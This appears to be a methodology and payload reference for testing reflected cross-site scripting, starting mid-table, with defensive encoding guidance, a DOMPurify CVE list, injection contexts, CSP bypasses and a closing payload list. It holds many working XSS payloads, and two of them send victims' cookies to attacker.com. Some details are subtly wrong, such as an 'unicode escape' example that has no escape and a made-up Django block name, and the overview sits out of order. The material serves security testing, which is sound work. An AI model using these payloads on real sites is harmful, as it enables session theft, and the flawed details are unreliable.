| Output Context | Required Encoding | Language Examples |
|---|---|---|
| HTML body | `< -> &lt;`, `> -> &gt;`, `& -> &amp;`, `" -> &quot;`, `' -> &#x27;` | PHP: `htmlspecialchars()`, Python/Jinja2: auto-escape, Java: OWASP Encoder |
| HTML attribute (quoted) | Same as HTML body, always use quotes around attribute values | Same as above |
| JavaScript string | `' -> \'`, `" -> \"`, `\ -> \\`, newlines -> `\n`, prevent `</script>` | PHP: `json_encode()`, Python: `json.dumps()`, Java: OWASP `forJavaScript()` |
| URL parameter | `< -> %3C`, `" -> %22` | PHP: `urlencode()`, Python: `urllib.parse.quote()`, JS: `encodeURIComponent()` |
| Inline JSON in `<script>` | JSON encode + replace `<` with `\u003C` | Use framework-native serialization |

### Safe DOM APIs

```javascript
// SAFE
element.textContent = userValue;
document.createTextNode(userValue);
element.setAttribute('data-x', userValue);  // safe attributes only
document.createElement('p').textContent = userValue;

// UNSAFE - avoid
element.innerHTML = userValue;
element.outerHTML = userValue;
document.write(userValue);
eval(userValue);
```

### Defense in Depth

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'self';
```

- Cookie flags: `HttpOnly; Secure; SameSite=Lax`
- `X-Content-Type-Options: nosniff`
- Trusted Types (Chromium only): `require-trusted-types-for 'script'`
- Do NOT set `X-XSS-Protection` — removed from all major browsers (Chrome 78 / Safari 13 / 2019+)

---

## DOMPurify Version Reference

| Version | Key Security Event |
|---|---|
| <= 2.0.17 | Bentkowski namespace confusion bypass |
| <= 2.2.2 | vovohelo namespace confusion variant |
| < 3.1.1 | DOM clobbering via `parentNode` |
| < 3.1.2 | Second-order DOM clobbering |
| < 3.2.4 | **CVE-2025-26791** (CVSS 4.5) — SAFE_FOR_TEMPLATES template literal reassembly mXSS |
| < 3.3.2 | **GHSA-cj63-jhhr-wcxv** — Array.prototype pollution |
| 3.0.1-3.3.3 | **CVE-2026-41238** — `|| {}` fallback inherits from Object.prototype; custom elements with event handlers admitted |
| < 3.4.5 | **CVE-2026-47423** — Chrome 130+ `<selectedcontent>` re-cloning after sanitization |
| 3.4.9 | Current latest — all catalogued attack classes closed |

**Integration best practices:**
- Use `RETURN_DOM_FRAGMENT` instead of string output — avoids serialization/reparsing mXSS
- Do NOT modify sanitized content after sanitization
- Run sanitizer on the same browser engine as deployment target (server-side jsdom != browser DOMPurify)
- Pair with CSP — sanitizers are one layer, not complete defense

---

## Legacy Techniques (Do Not Test For)

| Technique | Status | Removed |
|---|---|---|
| XSS Auditor (`X-XSS-Protection`) | OBSOLETE | Chrome 78 (July 2019), Safari 13 (2019) |
| IE conditional comments `<!--[if IE]>` | LEGACY | IE discontinued |
| VBScript protocol handlers | LEGACY | IE discontinued |
| CSS `expression()` evaluates JS | LEGACY | All modern browsers |
| Flash/Java plugin XSS | LEGACY | Plugins deprecated |
| `document.domain` setter (cross-subdomain) | DEPRECATED | Chrome 115+ ignores it |

---

## Framework Detection Quick Reference

| Indicator in Page Source | Framework |
|---|---|
| `__NEXT_DATA__` script tag | Next.js |
| `__NUXT__` or `__NUXT_DATA__` | Nuxt |
| `ng-version` attribute on root element | Angular |
| `data-svelte-h` attributes | SvelteKit |
| `data-astro-*` attributes | Astro |
| `hx-*` attributes on elements | HTMX |
| `x-data`, `x-bind` attributes | Alpine.js |
| `_$HY` or `data-hk` attributes | SolidJS |
| `q:container` attribute on root element | Qwik |
| `data-reactroot` attribute | React |

20-chunk deep research and testing framework for reflected XSS across all injection contexts, frameworks, and defenses. Includes source-sink analysis, browser parsing differentials, CSP bypass, false-positive elimination, and DOMPurify CVE confidence tracking.

---

## Scope & Classification (Chunk 01)

**Reflected XSS Types:**
- Classic reflected: parameter echoed in HTML response
- DOM-based reflected: parameter flows through JS to sink
- Reflected-stored hybrid: reflected value stored in DOM state
- JSON reflected: parameter echoed in JSON response consumed by JS

**Out-of-scope (handle in separate skills):**
- Stored/persistent XSS
- Self-XSS requiring social engineering
- XSS via file upload in separate origin

---

## Input Sources (Chunks 02–03)

**URL Parameters:**
```
?q=PAYLOAD&search=PAYLOAD&redirect=PAYLOAD
?next=/PAYLOAD&url=PAYLOAD&return=PAYLOAD
?error=PAYLOAD&message=PAYLOAD&msg=PAYLOAD
```

**HTTP Headers (reflected in response):**
- `Referer:` — often reflected in "You came from..." messages
- `User-Agent:` — reflected in browser-specific error pages
- `Accept-Language:` — reflected in language detection
- `X-Forwarded-For:` — reflected in debug/admin pages
- Custom headers: `X-Custom-Header:`

**URL Fragment (DOM-based):**
```javascript
// window.location.hash → innerHTML
document.getElementById('content').innerHTML = decodeURIComponent(window.location.hash.slice(1));
```

**PostMessage:**
```javascript
window.addEventListener('message', function(e) {
  document.getElementById('content').innerHTML = e.data;  // sink
});
```

---

## Browser Parsing & Decoding (Chunk 04)

**HTML Entity Decoding:**
- Browsers decode HTML entities before JS execution
- `&lt;script&gt;` → `<script>` after HTML decode
- Double encoding: `&amp;lt;script&amp;gt;` → `&lt;script&gt;` → `<script>`

**URL Decoding Order:**
- `%3Cscript%3E` decoded by browser → `<script>` in HTML context
- Double URL encoding: `%253Cscript%253E` → `%3Cscript%3E` → `<script>`

**JS Unicode/Escape:**
```javascript
eval('<script>alert(1)</script>')  // unicode escape
eval('\x3cscript\x3e')  // hex escape
```

---

## Injection Contexts

### HTML Body Context (Chunk 03)
```html
<!-- Classic -->
<div>PAYLOAD</div>
<!-- Inject: <script>alert(1)</script> or <img src=x onerror=alert(1)> -->

<!-- Tag break-out -->
</div><script>alert(1)</script>
```

### HTML Attribute Context (Chunk 05)
```html
<!-- Unquoted attribute -->
<input value=PAYLOAD>
<!-- Inject: onmouseover=alert(1) -->

<!-- Double-quoted attribute -->
<input value="PAYLOAD">
<!-- Inject: " onmouseover="alert(1) or "><script>alert(1)</script> -->

<!-- href/src attribute (javascript: URI) -->
<a href="PAYLOAD">
<!-- Inject: javascript:alert(1) -->

<!-- Event handler attribute -->
<img src=x onerror="PAYLOAD">
<!-- Inject: alert(1) or fetch('//attacker.com/'+document.cookie) -->
```

### JavaScript Context (Chunk 06)
```html
<!-- String context -->
<script>var x = "PAYLOAD";</script>
<!-- Inject: ";alert(1);// or \";alert(1);// -->

<!-- Template literal -->
<script>var x = `PAYLOAD`;</script>
<!-- Inject: ${alert(1)} -->

<!-- Assignment without quotes -->
<script>var x = PAYLOAD;</script>
<!-- Inject: alert(1);// -->
```

### URL/JSON Context (Chunk 06)
```javascript
// URL in JS → open redirect to XSS
window.location = "PAYLOAD";
// Inject: javascript:alert(1)

// JSON reflected without encoding
var data = {"key": "PAYLOAD"};
// Inject: "};alert(1);// (break JSON)
```

### Special Contexts (Chunk 07)
```html
<!-- HTML comment context -->
<!-- PAYLOAD -->
<!-- Inject: --><script>alert(1)</script><!--  -->

<!-- CSS context (style attribute) -->
<div style="color: PAYLOAD">
<!-- Inject: red;} body{background:url(javascript:alert(1))} (old browsers) -->

<!-- Inside <script> tag but quoted -->
<script>/* PAYLOAD */</script>
<!-- Inject: */alert(1);/* -->
```

---

## Framework-Specific Testing (Chunks 09–10)

### React
- `dangerouslySetInnerHTML` — bypass if used without DOMPurify
- JSX attribute injection: `onClick={PAYLOAD}` if props not sanitized
- `javascript:` URI in `href` prop

### Angular
- `[innerHTML]="payload"` — Angular sanitizes by default, but `bypassSecurityTrustHtml()` bypasses
- Expression injection in Angular 1.x: `{{constructor.constructor('alert(1)')()}}`
- Template injection if server renders Angular template

### Vue
- `v-html="payload"` — no built-in sanitization
- Server-side Vue SSR with unsanitized data

### Django
- `{{ variable|safe }}` — marks output as safe, disabling escaping
- `mark_safe()` in Python code
- `AutoEscapeOff` template block

### Rails
- `raw(variable)` and `html_safe` bypass auto-escaping
- `content_tag` with untrusted data

### Next.js
- `dangerouslySetInnerHTML` in React components
- `getServerSideProps` returning unsanitized user input
- API route reflecting URL params in HTML response

---

## OAuth & API Docs XSS (Chunk 08)
- OAuth error_description reflected in callback page: `/oauth/callback?error_description=PAYLOAD`
- OpenAPI/Swagger UI: `operationId`, `description` fields rendered as HTML
- Redoc/Stoplight: markdown rendering with XSS vectors
- Authorization server error page reflecting `redirect_uri`, `client_id`

---

## Sanitization & CSP Defense Analysis (Chunk 11)

**Common Sanitization Bypasses:**
```html
<!-- Attribute-less event handlers (older browsers) -->
<svg onload=alert(1)>
<body onpageshow=alert(1)>

<!-- Data URIs -->
<iframe src="data:text/html,<script>alert(1)</script>">

<!-- Protocol handlers -->
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>

<!-- Case variation -->
<sCrIpT>alert(1)</sCrIpT>
<IMG SRC=X ONERROR=alert(1)>
```

**CSP Bypass Techniques:**
- JSONP endpoint in allowed domain: `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">` 
- Angular CDN in CSP: `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js">` + Angular expression
- `unsafe-inline` or `unsafe-eval` present
- Overly broad `script-src`: `*.example.com` and subdomain takeover

---

## False Positive Elimination (Chunk 14)

Before writing a report:
1. Confirm execution in real browser (not just reflection)
2. Verify CSP is not blocking execution
3. Test in Chrome, Firefox, Safari — browser-specific behavior
4. Confirm input is actually reflected (not filtered before reflection)
5. Verify the reflected point is reachable without authentication
6. Check for SameSite cookie restrictions limiting attack surface

---

## Attack Vector Cards (Chunk 13)

```
Vector: Search parameter
Endpoint: /search?q=PAYLOAD
Context: HTML body
Test: <script>alert(1)</script>
Encoded: %3Cscript%3Ealert%281%29%3C%2Fscript%3E
If filtered: <img src=x onerror=alert(1)>

Vector: Error message
Endpoint: /login?error=PAYLOAD  
Context: HTML attribute (class="error PAYLOAD")
Test: " onmouseover="alert(1)
```

---

## Source-Sink Transformation (Chunk 19)

**Common Source → Transform → Sink chains:**
```javascript
// Source: URL parameter
let query = new URLSearchParams(location.search).get('q');  // Source

// Transform: unsafe decode
query = decodeURIComponent(query);  // may introduce XSS vectors

// Sink
document.getElementById('results').innerHTML = query;  // XSS sink
```

**JS Sink Catalog:**
- `innerHTML`, `outerHTML` — most common
- `document.write()`, `document.writeln()`
- `insertAdjacentHTML()`
- `eval()`, `Function()`, `setTimeout(str)`, `setInterval(str)`
- `location.href = `, `location.assign()` — open redirect + XSS
- `src` / `href` attributes set via JS

---

## Key Payloads

```html
<!-- Universal -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Attribute context -->
" onmouseover="alert(1)
' onmouseover='alert(1)
onmouseover=alert(1) x="

<!-- JavaScript context -->
";alert(1);//
'-alert(1)-'
${alert(1)}

<!-- CSP bypass with nonce -->
<script nonce="KNOWN_NONCE">alert(1)</script>

<!-- Data exfiltration -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```
